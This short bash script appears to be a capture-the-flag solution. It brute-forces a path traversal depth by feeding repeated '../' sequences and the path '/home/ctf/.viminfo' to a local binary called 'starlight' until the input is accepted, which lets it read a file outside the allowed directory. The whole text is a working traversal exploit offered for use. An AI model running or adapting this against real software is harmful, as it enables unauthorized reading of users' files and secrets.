A='../'
while true;do
data=$(echo -e "${A}./home/ctf/.viminfo"|./starlight)
if ! echo $data | grep "Error: language not found"; then
   echo -e "${A}\n"
   break
fi
A=$A'../'
done
